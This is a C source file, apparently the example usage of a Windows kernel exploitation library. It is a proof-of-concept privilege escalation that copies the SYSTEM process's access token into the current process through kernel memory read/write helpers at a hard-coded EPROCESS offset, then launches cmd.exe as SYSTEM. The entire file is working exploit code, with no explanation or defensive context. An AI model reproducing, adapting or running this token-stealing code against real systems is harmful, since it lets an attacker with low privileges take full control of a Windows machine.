#include "runtime.h"
#include "ksup.h"
#include "kpsb.h"
#include "paging.h"
#include "bootstrap.h"
#include "app.h"

// Example usage.

#define POC_EPROCESS_TOKEN_OFFSET 0x358

NTSTATUS
PocStealToken(
	HANDLE app,
	PVOID src_process,
	PVOID dst_process
	)
{
	ULONGLONG token;
	ULONGLONG token_src_addr;
	ULONGLONG token_dst_addr;
	NTSTATUS  status;

	token_src_addr = ( ( ULONGLONG )src_process + POC_EPROCESS_TOKEN_OFFSET );
	token_dst_addr = ( ( ULONGLONG )dst_process + POC_EPROCESS_TOKEN_OFFSET );

	if( !NT_SUCCESS( status = KsupReadProcessVirtualMemory( app, src_process, token_src_addr, &token, sizeof( token ) ) ) )
		return status;

	token &= ~0xf;

	if( !NT_SUCCESS( status = KsupWriteProcessVirtualMemory( app, dst_process, token_dst_addr, &token, sizeof( token ) ) ) )
		return status;

	return STATUS_SUCCESS;
}

VOID
PocSpawnCmd(
	VOID
	)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOA        si;

	RtlSecureZeroMemory( &pi, sizeof( pi ) );
	RtlSecureZeroMemory( &si, sizeof( si ) );

	si.cb = sizeof( si );

	if( CreateProcessA( NULL, "cmd.exe", NULL, NULL, 0, 0, NULL, NULL, &si, &pi ) )
	{
		NtClose( pi.hProcess );
		NtClose( pi.hThread );
	}
}

BOOL
STDAPICALLTYPE
WinConsoleEntry(
	VOID
	)
{
	HANDLE    app;
	PVOID     system;
	PVOID     process;
	ULONGLONG pid;
	NTSTATUS  status;

	if( NT_SUCCESS( AppCreate( &app ) ) )
	{
		pid = ( ULONGLONG )NtCurrentTeb()->ClientId.UniqueProcess;

		do
		{
			if( !( system = KsupGetSystemProcess( app ) ) )
				break;

			if( !NT_SUCCESS( KsupLookupProcessById( app, pid, &process ) ) )
				break;

			status = PocStealToken( app, system, process );

		} while( FALSE );

		AppClose( app );
	}

	if( NT_SUCCESS( status ) )
		PocSpawnCmd( );

	ExitProcess( 0 );

	return TRUE;
} 